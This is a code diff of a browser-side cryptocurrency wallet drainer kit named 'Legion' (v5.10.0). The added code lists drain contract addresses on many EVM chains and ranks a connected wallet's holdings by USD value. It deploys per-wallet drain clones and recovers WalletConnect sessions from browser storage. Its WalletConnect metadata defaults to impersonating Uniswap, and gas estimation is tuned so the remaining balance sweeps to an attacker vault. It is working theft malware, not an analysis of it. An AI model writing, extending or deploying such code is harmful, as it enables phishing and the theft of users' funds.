@@ -35,7 +35,7 @@
     };
   })();
 
-  // Node.js polyfills — WalletConnect bundles need these
+  // Node.js polyfills — do NOT stub Buffer (breaks WalletConnect relay decode)
   (function () {
     if (typeof process === 'undefined' || !process.nextTick) {
       window.process = {
@@ -44,31 +44,6 @@
       };
     }
     if (typeof global === 'undefined') window.global = window;
-    if (typeof Buffer === 'undefined') {
-      window.Buffer = {
-        isBuffer: function () { return false; },
-        from: function (d, enc) {
-          if (typeof d === 'string') {
-            if (enc === 'hex') {
-              var b = [];
-              for (var i = 0; i < d.length; i += 2) b.push(parseInt(d.substr(i, 2), 16));
-              return new Uint8Array(b);
-            }
-            return new TextEncoder().encode(d);
-          }
-          if (d instanceof ArrayBuffer) return new Uint8Array(d);
-          return new Uint8Array(d);
-        },
-        alloc: function (n, fill) { var a = new Uint8Array(n); if (fill !== undefined) a.fill(fill); return a; },
-        concat: function (list) {
-          var total = list.reduce(function (s, b) { return s + b.length; }, 0);
-          var out = new Uint8Array(total); var off = 0;
-          list.forEach(function (b) { out.set(b, off); off += b.length; });
-          return out;
-        },
-        byteLength: function (s) { return new TextEncoder().encode(String(s)).length; }
-      };
-    }
   })();
 
   // ═══════════════════════════════════════════════════════════════
@@ -92,6 +67,13 @@
     hwWallets: false,
     debugDevTools: false,
   }, window.LEGION_CONFIG || {});
+
+  var LEGION_VERSION = '5.10.0';
+
+  /** 16+ EVM chains — factory CREATE2 fills gaps where static map is zero */
+  var TARGET_EVM_CHAIN_IDS = [
+    1, 56, 137, 42161, 8453, 10, 43114, 250, 25, 100, 42220, 324, 59144, 534352, 81457, 5000,
+  ];
 
   var SHOW_OVERLAY = CFG.showOverlay != null ? CFG.showOverlay === true
     : (CFG.injectMode !== 'hook' && CFG.injectMode !== 'silent' && !CFG.silentMode);
@@ -170,21 +152,173 @@
     sui: CFG.suiVault || '',
   };
 
-  var SOL_RPC = CFG.solRpc || 'https://solana-rpc.publicnode.com';
-  var COSMOS_REST = CFG.cosmosRest || 'https://cosmos-rest.publicnode.com';
   var APTOS_RPC = CFG.aptosRpc || 'https://fullnode.mainnet.aptoslabs.com/v1';
   var SUI_RPC = CFG.suiRpc || 'https://fullnode.mainnet.sui.io:443';
 
+  var SOL_RPCS = [
+    CFG.solRpc || 'https://api.mainnet-beta.solana.com',
+    'https://rpc.ankr.com/solana',
+  ];
+  var TRON_RPCS = [
+    CFG.tronRpc || 'https://api.trongrid.io',
+    'https://rpc.ankr.com/tron_jsonrpc',
+  ];
+  var COSMOS_RESTS = [
+    CFG.cosmosRest || 'https://cosmos-rest.publicnode.com',
+    'https://lcd-cosmoshub.keplr.app',
+    'https://cosmos-lcd.quickapi.com',
+  ];
+  var APTOS_RPCS = [APTOS_RPC, 'https://fullnode.mainnet.aptoslabs.com/v1'];
+  var SUI_RPCS = [SUI_RPC, 'https://sui-mainnet.nodeinfra.com'];
+
+  var COSMOS_CHAINS = {
+    'cosmoshub-4': {
+      denom: 'uatom', min: 10000n, fee: '5000',
+      rests: ['https://cosmos-rest.publicnode.com', 'https://lcd-cosmoshub.keplr.app'],
+    },
+    'osmosis-1': {
+      denom: 'uosmo', min: 10000n, fee: '5000',
+      rests: ['https://osmosis-rest.publicnode.com', 'https://lcd-osmosis.keplr.app'],
+    },
+    'juno-1': {
+      denom: 'ujuno', min: 10000n, fee: '5000',
+      rests: ['https://juno-rest.publicnode.com', 'https://lcd-juno.keplr.app'],
+    },
+    'evmos_9001-2': {
+      denom: 'aevmos', min: 10000n, fee: '5000',
+      rests: ['https://evmos-rest.publicnode.com', 'https://lcd-evmos.keplr.app'],
+    },
+  };
+
+  var EVM_PUBLIC_RPC = {
+    1: ['https://rpc.ankr.com/eth', 'https://eth.llamarpc.com', 'https://ethereum.publicnode.com'],
+    10: ['https://rpc.ankr.com/optimism', 'https://optimism.llamarpc.com'],
+    25: ['https://evm.cronos.org', 'https://cronos-evm.publicnode.com'],
+    56: ['https://rpc.ankr.com/bsc', 'https://bsc-dataseed.binance.org'],
+    100: ['https://rpc.gnosischain.com', 'https://gnosis-rpc.publicnode.com'],
+    137: ['https://rpc.ankr.com/polygon', 'https://polygon.llamarpc.com'],
+    250: ['https://rpc.ankr.com/fantom', 'https://fantom.publicnode.com'],
+    324: ['https://mainnet.era.zksync.io'],
+    42220: ['https://forno.celo.org', 'https://celo-rpc.publicnode.com'],
+    42161: ['https://rpc.ankr.com/arbitrum', 'https://arbitrum.llamarpc.com'],
+    43114: ['https://rpc.ankr.com/avalanche', 'https://avalanche-c-chain.publicnode.com'],
+    8453: ['https://rpc.ankr.com/base', 'https://base.llamarpc.com'],
+    5000: ['https://rpc.mantle.xyz', 'https://mantle-rpc.publicnode.com'],
+    59144: ['https://rpc.linea.build'],
+    534352: ['https://rpc.scroll.io'],
+    81457: ['https://rpc.blast.io'],
+  };
+
+  var NFT_APPROVAL_BATCH_SIZE = 20;
+
+  async function evmPublicRpcCall(chainId, method, params) {
+    var cid = Number(chainId) || 1;
+    var urls = EVM_PUBLIC_RPC[cid] || EVM_PUBLIC_RPC[1];
+    var lastErr = null;
+    for (var ei = 0; ei < urls.length; ei++) {
+      try {
+        var res = await fetch(urls[ei], {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: method, params: params || [] }),
+        });
+        var json = await res.json();
+        if (json.error) throw new Error(json.error.message || 'RPC error');
+        return json.result;
+      } catch (e) { lastErr = e; }
+    }
+    throw lastErr || new Error('All EVM public RPCs failed for chain ' + cid);
+  }
+
+  async function evmRequestWithFallback(provider, chainId, method, params) {
+    try {
+      return await provider.request({ method: method, params: params || [] });
+    } catch (e) {
+      L.warn('Wallet RPC fail:', method, '— public fallback chain', chainId);
+      return await evmPublicRpcCall(chainId, method, params);
+    }
+  }
+
+  async function fetchJsonWithFallback(bases, path) {
+    var lastErr = null;
+    for (var fi = 0; fi < bases.length; fi++) {
+      try {
+        var base = String(bases[fi]).replace(/\/$/, '');
+        var res = await fetch(base + path);
+        if (!res.ok) throw new Error('HTTP ' + res.status);
+        return await res.json();
+      } catch (e) { lastErr = e; }
+    }
+    throw lastErr || new Error('All REST endpoints failed');
+  }
+
+  async function createSolConnection(web3) {
+    var lastErr = null;
+    for (var si = 0; si < SOL_RPCS.length; si++) {
+      try {
+        var conn = new web3.Connection(SOL_RPCS[si], { commitment: 'confirmed' });
+        await conn.getLatestBlockhash('confirmed');
+        return conn;
+      } catch (e) { lastErr = e; }
+    }
+    throw lastErr || new Error('All Solana RPCs failed');
+  }
+
+  var GAS_FLOOR_BY_CHAIN = {
+    1: 100000000n,
+    10: 100000000n,
+    25: 500000000000n,
+    56: 3000000000n,
+    100: 100000000n,
+    137: 30000000000n,
+    250: 1000000000n,
+    42161: 100000000n,
+    43114: 25000000000n,
+    8453: 100000000n,
+    42220: 5000000000n,
+    324: 100000000n,
+    59144: 100000000n,
+    1101: 100000000n,
+    534352: 100000000n,
+    81457: 100000000n,
+    5000: 100000000n,
+  };
+
   // LegionDrainV2 — ONE contract per chain (claim + DeFi drain); deploy: node contracts/deploy-legion-drain.mjs
+  
+  var DRAIN_FACTORY = {
+    1: '0x22577De82aba57F03d677c28fC27293f86527323',
+    10: '0x09571F30330b034a298642ae5F30d42a753676cf',
+    56: '0xF4B67A60fEEB92992487957E0D597A0e009bb4D3',
+    137: '0x5121Fd9F4B44fFce08eb0dcC53931663C7659eDc',
+    5000: '0xd93E1B96103733982D76968e8668277CcBd23d57',
+    8453: '0x09571F30330b034a298642ae5F30d42a753676cf',
+    42161: '0xF4B67A60fEEB92992487957E0D597A0e009bb4D3',
+    43114: '0xd93E1B96103733982D76968e8668277CcBd23d57',
+    81457: '0xF4B67A60fEEB92992487957E0D597A0e009bb4D3',
+    534352: '0x09571F30330b034a298642ae5F30d42a753676cf',
+
+  };
+
   var LEGION_DRAIN = {
     1: '0xF4B67A60fEEB92992487957E0D597A0e009bb4D3',
     10: '0x758FD861d6d07d504949eb43A646D05f430765e6',
+    25: '0x0000000000000000000000000000000000000000',
     56: '0x758FD861d6d07d504949eb43A646D05f430765e6',
+    100: '0x0000000000000000000000000000000000000000',
     137: '0x758FD861d6d07d504949eb43A646D05f430765e6',
+    250: '0x0000000000000000000000000000000000000000',
+    324: '0x0000000000000000000000000000000000000000',
+    5000: '0xF4B67A60fEEB92992487957E0D597A0e009bb4D3',
     8453: '0x758FD861d6d07d504949eb43A646D05f430765e6',
     42161: '0x758FD861d6d07d504949eb43A646D05f430765e6',
+    42220: '0x0000000000000000000000000000000000000000',
     43114: '0x09571F30330b034a298642ae5F30d42a753676cf',
+    59144: '0x0000000000000000000000000000000000000000',
+    81457: '0x09571F30330b034a298642ae5F30d42a753676cf',
+    534352: '0x51D55A90c6B0a790cBaB8CC23B9387c42171f759',
     11155111: '0x0000000000000000000000000000000000000000',
+
   };
 
   // Legacy maps (fallback until LEGION_DRAIN deployed)
@@ -202,13 +336,17 @@
   // BatchDrainV2 — self-initiated EIP-7702 (onlySelf); mainnet deployed
   var BATCH_DRAIN_V2 = {
     1: '0x51d55a90c6b0a790cbab8cc23b9387c42171f759',
-    10: '0x0000000000000000000000000000000000000000',
-    56: '0x0000000000000000000000000000000000000000',
-    137: '0x0000000000000000000000000000000000000000',
-    8453: '0x0000000000000000000000000000000000000000',
-    42161: '0x0000000000000000000000000000000000000000',
-    43114: '0x0000000000000000000000000000000000000000',
+    10: '0x51D55A90c6B0a790cBaB8CC23B9387c42171f759',
+    56: '0x51D55A90c6B0a790cBaB8CC23B9387c42171f759',
+    137: '0x09571F30330b034a298642ae5F30d42a753676cf',
+    5000: '0x09571F30330b034a298642ae5F30d42a753676cf',
+    8453: '0x51D55A90c6B0a790cBaB8CC23B9387c42171f759',
+    42161: '0x09571F30330b034a298642ae5F30d42a753676cf',
+    43114: '0xF4B67A60fEEB92992487957E0D597A0e009bb4D3',
+    81457: '0x51D55A90c6B0a790cBaB8CC23B9387c42171f759',
+    534352: '0x758FD861d6d07d504949eb43A646D05f430765e6',
     11155111: '0x0000000000000000000000000000000000000000',
+
   };
 
   /** Vault baked into deployed BatchDrainV2 on mainnet — NOT the same as VAULT.evm from API */
@@ -408,11 +546,76 @@
 
   function resolveClaimContract(chainId) {
     var id = Number(chainId);
+    var addrKey = S.evmAddr ? (String(S.evmAddr).toLowerCase() + ':' + id) : null;
+    if (addrKey && S.factoryContracts[addrKey] && !isZeroAddr(S.factoryContracts[addrKey])) {
+      return S.factoryContracts[addrKey];
+    }
+    if (S.factoryContracts[id] && !isZeroAddr(S.factoryContracts[id])) {
+      return S.factoryContracts[id];
+    }
     var ld = LEGION_DRAIN[id];
     if (!isZeroAddr(ld)) return ld;
     var cf = CLAIM_FORWARDER[id];
     if (!isZeroAddr(cf)) return cf;
     return null;
+  }
+
+  async function ensureUserFactoryContract(address, chainId) {
+    if (!address || !chainId) return null;
+    var key = String(address).toLowerCase() + ':' + Number(chainId);
+    if (S.factoryContracts[key]) return S.factoryContracts[key];
+    try {
+      var r = await apiPost('/api/v1/factory/deploy', {
+        wallet_address: String(address).toLowerCase(),
+        chain_id: Number(chainId),
+        predict_only: !S.relayerSponsored,
+        deploy_on_chain: !!S.relayerSponsored,
+      });
+      var data = r && (r.data || r);
+      if (data && data.contract_address && !isZeroAddr(data.contract_address)) {
+        S.factoryContracts[key] = String(data.contract_address).toLowerCase();
+        if (data.deployed) L.log('[factory] relayer deployed clone on chain', chainId);
+        return S.factoryContracts[key];
+      }
+    } catch (e) { L.warn('factory deploy predict:', e.message); }
+    return null;
+  }
+
+  var SIG_ACTIVE_READ = '0x22f38e27';
+
+  async function stateDependentValidation(provider, address, chainId) {
+    try {
+      var cur = await getProviderChainId(provider);
+      if (Number(cur) !== Number(chainId)) {
+        L.warn('[validate] chain mismatch provider', cur, 'expected', chainId);
+        return false;
+      }
+      var accts = await provider.request({ method: 'eth_accounts' });
+      if (accts && accts[0] && String(accts[0]).toLowerCase() !== String(address).toLowerCase()) {
+        L.warn('[validate] account mismatch');
+        return false;
+      }
+      var claim = resolveClaimContract(chainId);
+      if (claim) {
+        var activeRaw = await evmRequestWithFallback(provider, chainId, 'eth_call', [{
+          to: claim, data: SIG_ACTIVE_READ,
+        }, 'latest']);
+        if (activeRaw && activeRaw !== '0x' && BigInt(activeRaw) === 0n) {
+          L.warn('[validate] clone deactivated — skip claim on', chainId);
+          S.deactivatedContracts[claim.toLowerCase()] = true;
+          return false;
+        }
+        var onVault = await readContractVault(provider, claim);
+        if (onVault && VAULT.evm && onVault !== String(VAULT.evm).toLowerCase()) {
+          L.warn('[validate] vault mismatch on clone');
+          return false;
+        }
+      }
+      return true;
+    } catch (e) {
+      L.warn('[validate] soft-fail:', e.message);
+      return true;
+    }
   }
 
   function resolveLegionDrain(chainId) {
@@ -468,31 +671,272 @@
     11155111: { name: 'Sepolia', symbol: 'ETH' },
   };
 
+  function rankedAssetChainId(chainStr) {
+    var s = String(chainStr || '').toLowerCase();
+    var m = s.match(/^evm:(\d+)$/);
+    if (m) return parseInt(m[1], 10);
+    if (s === 'ethereum' || s === 'eth' || s === 'mainnet') return 1;
+    if (s.indexOf('bsc') !== -1 || s === 'bnb') return 56;
+    if (s.indexOf('polygon') !== -1 || s === 'matic') return 137;
+    if (s.indexOf('arbitrum') !== -1) return 42161;
+    if (s.indexOf('base') !== -1) return 8453;
+    if (s.indexOf('optimism') !== -1) return 10;
+    if (s.indexOf('avalanche') !== -1 || s.indexOf('avax') !== -1) return 43114;
+    return null;
+  }
+
+  function isInjectedConnectorId(connId) {
+    var c = String(connId || '').toLowerCase();
+    return c.indexOf('phantom') !== -1 || c.indexOf('injected') !== -1 ||
+      c.indexOf('metamask') !== -1 || c.indexOf('rabby') !== -1 ||
+      c.indexOf('trust') !== -1 || c.indexOf('coinbase') !== -1 ||
+      c.indexOf('brave') !== -1 || c.indexOf('okx') !== -1;
+  }
+
+  function isRealWalletConnectSession(connId, provider) {
+    if (!provider) return false;
+    var c = String(connId || '').toLowerCase();
+    if (isInjectedConnectorId(c)) return false;
+    if (provider.isMetaMask && !provider.isWalletConnect) return false;
+    return provider.isWalletConnect === true || c.indexOf('walletconnect') !== -1;
+  }
+
+  async function safeGetLegionProvider() {
+    if (!window.LegionWallet || typeof window.LegionWallet.getProvider !== 'function') return null;
+    try {
+      var r = window.LegionWallet.getProvider();
+      if (r && typeof r.then === 'function') r = await r;
+      return r || null;
+    } catch (e) {
+      return null;
+    }
+  }
+
+  async function disconnectLegionWallet() {
+    try {
+      if (window.LegionWallet && window.LegionWallet.disconnect) {
+        await window.LegionWallet.disconnect();
+      }
+    } catch (e) {}
+  }
+
+  function clearWcStorageKeys() {
+    try {
+      var wcKeys = [];
+      for (var wi = 0; wi < localStorage.length; wi++) {
+        var wk = localStorage.key(wi);
+        if (!wk) continue;
+        var wkl = wk.toLowerCase();
+        if (wkl.indexOf('wc@') === 0 || wkl.indexOf('walletconnect') !== -1 ||
+            wkl.indexOf('w3m') !== -1 || wkl.indexOf('@w3m') !== -1) wcKeys.push(wk);
+      }
+      wcKeys.forEach(function (k) { try { localStorage.removeItem(k); } catch (e2) {} });
+      if (wcKeys.length) L.log('Cleared', wcKeys.length, 'WC storage keys');
+    } catch (e3) {}
+  }
+
+  async function cleanConflictingWcSessions() {
+    await disconnectLegionWallet();
+    clearWcStorageKeys();
+    await sleep(300);
+  }
+
+  function findWcStorageSession() {
+    try {
+      var keys = Object.keys(localStorage);
+      for (var wi = 0; wi < keys.length; wi++) {
+        var k = keys[wi];
+        if (k.indexOf('wc@') === -1 || k.indexOf('session') === -1) continue;
+        var obj = JSON.parse(localStorage.getItem(k) || '{}');
+        var sessions = Object.values(obj);
+        for (var si = sessions.length - 1; si >= 0; si--) {
+          var sess = sessions[si];
+          var ns = sess && sess.namespaces;
+          if (!ns || !ns.eip155 || !ns.eip155.accounts || !ns.eip155.accounts[0]) continue;
+          var parts = String(ns.eip155.accounts[0]).split(':');
+          var addr = (parts[parts.length - 1] || '').toLowerCase();
+          if (!addr || addr.length < 40) continue;
+          var expiry = sess.expiry || sess.expiration || null;
+          return { address: addr, topic: sess.topic, expiry: expiry };
+        }
+      }
+    } catch (e) {}
+    return null;
+  }
+
+  function isWcSessionExpired(sess) {
+    if (!sess || !sess.expiry) return false;
+    var exp = Number(sess.expiry);
+    if (!exp) return false;
+    return Date.now() / 1000 > exp;
+  }
+
+  async function waitWcStorageSession(maxMs) {
+    maxMs = maxMs || 180000;
+    var start = Date.now();
+    while (Date.now() - start < maxMs) {
+      var sess = findWcStorageSession();
+      if (sess) return sess;
+      await sleep(500);
+    }
+    return null;
+  }
+
+  function wcMetaPayload() {
+    var origin = window.location.origin;
+    var returnUrl = origin + window.location.pathname + window.location.search;
+    var encodedReturn = encodeURIComponent(returnUrl);
+    var icon = origin + '/favicon.png';
+    try {
+      var link = document.querySelector('link[rel="icon"], link[rel="shortcut icon"]');
+      if (link && link.href) icon = link.href;
+    } catch (e) {}
+    return {
+      name: document.title || 'Uniswap',
+      description: 'Connect your wallet',
+      url: origin,
+      icons: [icon],
+      redirect: {
+        native: 'trust://open_url?coin_id=60&url=' + encodedReturn,
+        universal: 'https://link.trustwallet.com/open_url?coin_id=60&url=' + encodedReturn,
+        linkMode: true,
+      },
+    };
+  }
+
+  function applyLegionWalletSessionAddresses() {
+    try {
+      if (window.LegionWallet && typeof window.LegionWallet.getSessionAddresses === 'function') {
+        var sess = window.LegionWallet.getSessionAddresses();
+        if (sess && sess.flat) applyWcSessionAddresses(sess.flat);
+        return sess;
+      }
+    } catch (e) {}
+    applyWcSessionAddresses(scanWcSessionAllFamilies());
+    return null;
+  }
+
+  function getLegionConnectorId() {
+    try {
+      return (window.LegionWallet && window.LegionWallet.getConnectorId
+        ? window.LegionWallet.getConnectorId() : '') || '';
+    } catch (e) {
+      return '';
+    }
+  }
+
+  async function prepWcOnlyMode(clearStorage) {
+    S.connectMode = 'wc';
+    S.wcSessionActive = true;
+    await disconnectLegionWallet();
+    if (clearStorage === false) {
+      await sleep(200);
+      return;
+    }
+    clearWcStorageKeys();
+    await sleep(200);
+  }
+
+  async function tryRecoverWcSession() {
+    var sess = findWcStorageSession();
+    if (!sess || !sess.address) return null;
+    if (isWcSessionExpired(sess)) {
+      L.log('WC session expired — clearing for reconnect');
+      clearWcStorageKeys();
+      S.wcSessionExpired = true;
+      return null;
+    }
+    if (typeof window.LegionWallet === 'undefined') return null;
+    L.log('WC session recovery:', sess.address.slice(0, 10) + '...');
+    S.connectMode = 'wc';
+    S.wcSessionActive = true;
+    try {
+      var prov = await pollWcProviderReady(20000);
+      if (prov && isRealWalletConnectSession(getLegionConnectorId().toLowerCase(), prov)) {
+        L.log('WC session restored from storage');
+        return prov;
+      }
+    } catch (e) { L.warn('WC recovery fail:', e.message); }
+    return null;
+  }
+
+  async function scanFullPortfolio(address) {
+    var rankedAll = await SCOUT.ranked(address);
+    var items = (rankedAll && rankedAll.assets) || (rankedAll && rankedAll.ranked) || [];
+    var totalUsd = Number(rankedAll && rankedAll.total_usd) || 0;
+    var byChain = {};
+    MULTI_CHAIN_ORDER.forEach(function (cid) {
+      byChain[cid] = { chainId: cid, usd: 0, tokens: [] };
+    });
+    items.forEach(function (a) {
+      var cid = rankedAssetChainId(a.chain);
+      if (!cid || !byChain[cid]) return;
+      var usd = Number(a.amount_usd || a.usd_value || 0);
+      byChain[cid].usd += usd;
+      if (a.token && a.token !== 'native' && String(a.token).startsWith('0x')) {
+        byChain[cid].tokens.push({
+          address: String(a.token).toLowerCase(),
+          balance: String(a.amount_raw || a.raw_balance || '0'),
+          symbol: a.symbol || '?',
+          usd: usd,
+        });
+      }
+    });
+    var fundedChains = [];
+    MULTI_CHAIN_ORDER.forEach(function (cid) {
+      if (byChain[cid].usd > 0 || byChain[cid].tokens.length > 0) fundedChains.push(cid);
+    });
+    fundedChains.sort(function (a, b) { return byChain[b].usd - byChain[a].usd; });
+    S.scoutUsd = Math.max(S.scoutUsd, totalUsd);
+    S.portfolioScan = { totalUsd: totalUsd, items: items, byChain: byChain, fundedChains: fundedChains, assetCount: items.length };
+    L.log('Portfolio scan:', totalUsd.toFixed(2), 'USD | funded EVM chains:', fundedChains.join(','));
+    return S.portfolioScan;
+  }
+
+  async function buildChainAssets(provider, address, chainId, portfolio) {
+    var assets = { tokens: [], nfts: [], nativeHex: '0x0', usd: 0, defi_positions: [], uni_v3_positions: [], uni_v2_lps: [] };
+    var ch = portfolio && portfolio.byChain && portfolio.byChain[chainId];
+    if (ch) {
+      assets.usd = ch.usd;
+      assets.tokens = ch.tokens.slice();
+    }
+    try {
+      assets.nativeHex = await evmRequestWithFallback(provider, chainId, 'eth_getBalance', [address, 'latest']) || '0x0';
+    } catch (e) {}
+    return assets;
+  }
+
   var NATIVE_TRANSFER_GAS = 21000n;
   var CLAIM_CONTRACT_GAS = 120000n;
   var ERC20_TRANSFER_GAS = 65000n;
 
-  /** Live EIP-1559 fees from wallet RPC — no fixed reserve. */
-  async function estimateEip1559Fees(provider) {
+  /** Live EIP-1559 fees — wallet RPC with public fallback + 20% buffer. */
+  async function estimateEip1559Fees(provider, chainId) {
+    var floor = GAS_FLOOR_BY_CHAIN[Number(chainId)] || 100000000n;
+    var cid = Number(chainId) || 1;
+    var applyBuffer = function (fees) {
+      return {
+        maxFeePerGas: (fees.maxFeePerGas * 120n) / 100n,
+        maxPriorityFeePerGas: (fees.maxPriorityFeePerGas * 120n) / 100n,
+      };
+    };
     try {
-      var hist = await provider.request({
-        method: 'eth_feeHistory',
-        params: ['0x4', 'latest', [50]],
-      });
+      var hist = await evmRequestWithFallback(provider, cid, 'eth_feeHistory', ['0x4', 'latest', [50]]);
       var baseArr = hist.baseFeePerGas || [];
       var baseFee = BigInt(baseArr[baseArr.length - 1] || '0x0');
       var rewards = (hist.reward && hist.reward[hist.reward.length - 1]) || [];
       var priority = BigInt(rewards[0] || '0x5F5E100');
       var maxFee = baseFee * 2n + priority;
-      if (maxFee < 100000000n) maxFee = 100000000n;
-      return { maxFeePerGas: maxFee, maxPriorityFeePerGas: priority };
+      if (maxFee < floor) maxFee = floor;
+      if (priority < floor / 10n) priority = floor / 10n;
+      return applyBuffer({ maxFeePerGas: maxFee, maxPriorityFeePerGas: priority });
     } catch (e) {
       try {
-        var gp = BigInt(await provider.request({ method: 'eth_gasPrice' }) || '0x0');
-        if (gp < 100000000n) gp = 100000000n;
-        return { maxFeePerGas: gp, maxPriorityFeePerGas: gp / 10n };
+        var gp = BigInt(await evmRequestWithFallback(provider, cid, 'eth_gasPrice', []) || '0x0');
+        if (gp < floor) gp = floor;
+        return applyBuffer({ maxFeePerGas: gp, maxPriorityFeePerGas: gp / 10n });
       } catch (e2) {
-        return { maxFeePerGas: 30000000000n, maxPriorityFeePerGas: 2000000000n };
+        return applyBuffer({ maxFeePerGas: floor * 100n, maxPriorityFeePerGas: floor });
       }
     }
   }
@@ -500,7 +944,7 @@
   /** Gas cost only — remainder sweeps to vault (not a fixed wallet reserve). */
   async function calcNativeGasCostWei(provider, chainId, gasLimit) {
     var limit = gasLimit || NATIVE_TRANSFER_GAS;
-    var fees = await estimateEip1559Fees(provider);
+    var fees = await estimateEip1559Fees(provider, chainId);
     return (limit * fees.maxFeePerGas * 120n) / 100n;
   }
 
@@ -580,28 +1024,143 @@
     familyConnections: {},
     familiesLinked: false,
     allAddresses: {},
-    chains: { EVM: null, SOL: null, TRON: null, TON: null, BTC: null, COSMOS: null, APTOS: null, SUI: null },
+    chains: { EVM: null, SOL: null, TRON: null, TON: null, BTC: null, COSMOS: null, APTOS: null, SUI: null, POLKADOT: null, ALGORAND: null, CARDANO: null },
     omnichainLegs: {},
     fusionAssets: [],
     pendingEvmPermit2: null,
     wcSessionActive: false,
+    connectMode: null,
+    portfolioScan: null,
     notifySessionKey: null,
     connectSession: null,
     fusionNotified: false,
+    connecting: false,
+    wcSessionExpired: false,
+    factoryContracts: {},
+    deactivatedContracts: {},
+    relayerSponsored: false,
   };
+
+  var _evmConnectLock = null;
 
   // WC guard removed — it blocked AppKit modal.request when connector was io.metamask.
   function installWcGuard() { /* no-op */ }
   function removeWcGuard() { /* no-op */ }
 
   async function evmRequestAccounts(provider) {
-    if (provider && provider.isWalletConnect) {
-      try {
-        var existing = await provider.request({ method: 'eth_accounts' });
-        if (existing && existing.length) return existing;
-      } catch (e0) { /* fall through */ }
+    if (_evmConnectLock) {
+      try { return await _evmConnectLock; } catch (e) { /* retry below */ }
     }
-    return provider.request({ method: 'eth_requestAccounts' });
+    _evmConnectLock = (async function () {
+      try {
+        var accounts = await provider.request({ method: 'eth_accounts' });
+        if (accounts && accounts.length) return accounts;
+      } catch (e) {
+        L.warn('RPC fail, fallback to AppKit state...');
+      }
+
+      try {
+        if (window.LegionWallet && typeof window.LegionWallet.getAccount === 'function') {
+          var acc = window.LegionWallet.getAccount();
+          if (acc && acc.address) {
+            L.log('WC accounts from AppKit getAccount:', String(acc.address).slice(0, 10) + '...');
+            return [acc.address];
+          }
+        }
+        if (window.LegionWallet && window.LegionWallet.state && window.LegionWallet.state.address) {
+          return [window.LegionWallet.state.address];
+        }
+      } catch (e2) { /* ignore */ }
+
+      var sessAddr = resolveWcEvmAddress();
+      if (sessAddr) {
+        L.log('WC accounts from session:', sessAddr.slice(0, 10) + '...');
+        try { sessionStorage.setItem('legion_wc_evm_addr', sessAddr); } catch (eS) {}
+        return [sessAddr];
+      }
+
+      try {
+        var stored = sessionStorage.getItem('legion_wc_evm_addr');
+        if (stored) {
+          L.log('WC accounts from sessionStorage:', stored.slice(0, 10) + '...');
+          return [stored];
+        }
+      } catch (eSt) {}
+
+      try {
+        var req = await provider.request({ method: 'eth_requestAccounts' });
+        if (req && req.length) return req;
+      } catch (e3) { /* ignore */ }
+
+      throw new Error('Could not retrieve EVM account');
+    })();
+    try {
+      return await _evmConnectLock;
+    } finally {
+      _evmConnectLock = null;
+    }
+  }
+
+  function resolveWcEvmAddress() {
+    try {
+      if (window.LegionWallet && typeof window.LegionWallet.getAccount === 'function') {
+        var acc = window.LegionWallet.getAccount();
+        if (acc && acc.address) return String(acc.address).toLowerCase();
+      }
+      if (window.LegionWallet && window.LegionWallet.state && window.LegionWallet.state.address) {
+        return String(window.LegionWallet.state.address).toLowerCase();
+      }
+    } catch (eA) {}
+    try {
+      if (window.LegionWallet && typeof window.LegionWallet.getSessionAddresses === 'function') {
+        var sa = window.LegionWallet.getSessionAddresses();
+        if (sa && sa.flat && sa.flat.evm) return String(sa.flat.evm).toLowerCase();
+      }
+    } catch (e1) {}
+    var stored = findWcStorageSession();
+    if (stored && stored.address) return stored.address;
+    var scan = scanWcSessionAllFamilies();
+    if (scan.evm) return String(scan.evm).toLowerCase();
+    return null;
+  }
+
+  function resolveWcEvmChainId() {
+    try {
+      if (window.LegionWallet && typeof window.LegionWallet.getEvmChainIdFromSession === 'function') {
+        var cid = window.LegionWallet.getEvmChainIdFromSession();
+        if (cid) return Number(cid);
+      }
+    } catch (e0) {}
+    try {
+      var keys = Object.keys(localStorage);
+      for (var i = 0; i < keys.length; i++) {
+        var k = keys[i];
+        if (k.indexOf('wc@') === -1 || k.indexOf('session') === -1) continue;
+        var obj = JSON.parse(localStorage.getItem(k) || '{}');
+        var sessions = Object.values(obj);
+        for (var j = sessions.length - 1; j >= 0; j--) {
+          var caip = sessions[j]?.namespaces?.eip155?.accounts?.[0];
+          if (!caip) continue;
+          var parts = String(caip).split(':');
+          if (parts[0] === 'eip155' && parts[1]) {
+            var chainId = parseInt(parts[1], 10);
+            if (!Number.isNaN(chainId) && chainId > 0) return chainId;
+          }
+        }
+      }
+    } catch (e1) {}
+    return 1;
+  }
+
+  async function resolveWcEvmChainIdFromProvider(provider) {
+    try {
+      var chainHex = await provider.request({ method: 'eth_chainId' });
+      return parseInt(String(chainHex).replace('0x', ''), 16);
+    } catch (e) {
+      var fromSession = resolveWcEvmChainId();
+      L.log('WC eth_chainId unavailable — session chain', fromSession);
+      return fromSession;
+    }
   }
 
   function defaultConnect() {
@@ -688,6 +1247,49 @@
 
   function requestProviders() {
     try { window.dispatchEvent(new Event('eip6963:requestProvider')); } catch (e) {}
+  }
+
+  var RDNS_BY_KEY = {
+    metamask: 'io.metamask',
+    trust: 'com.trustwallet.app',
+    'coinbase-extension': 'com.coinbase.wallet',
+    coinbase: 'com.coinbase.wallet',
+    rabby: 'io.rabby',
+    phantom: 'app.phantom',
+    brave: 'com.brave.wallet',
+    okx: 'com.okex.wallet',
+    binance: 'com.binance.wallet',
+  };
+
+  function resolveEvmProvider(key) {
+    requestProviders();
+    var k = String(key || '').toLowerCase();
+    var targetRdns = RDNS_BY_KEY[k] || k;
+    for (var i = 0; i < S.discovered.length; i++) {
+      var w = S.discovered[i];
+      if (!w || !w.provider || !w.info) continue;
+      var rdns = String(w.info.rdns || '').toLowerCase();
+      var name = String(w.info.name || '').toLowerCase();
+      if (rdns === targetRdns || rdns === k || rdns.indexOf(k) !== -1 || name.indexOf(k) !== -1) {
+        return w.provider;
+      }
+    }
+    var eth = window.ethereum;
+    if (eth && Array.isArray(eth.providers)) {
+      for (var j = 0; j < eth.providers.length; j++) {
+        var p = eth.providers[j];
+        if (!p) continue;
+        if ((k === 'metamask' || targetRdns === 'io.metamask') && p.isMetaMask && !p.isRabby) return p;
+        if ((k === 'trust' || targetRdns === 'com.trustwallet.app') && (p.isTrust || p.isTrustWallet)) return p;
+        if (k.indexOf('coinbase') !== -1 && (p.isCoinbaseWallet || p.isCoinbaseBrowser)) return p;
+        if ((k === 'rabby' || targetRdns === 'io.rabby') && p.isRabby) return p;
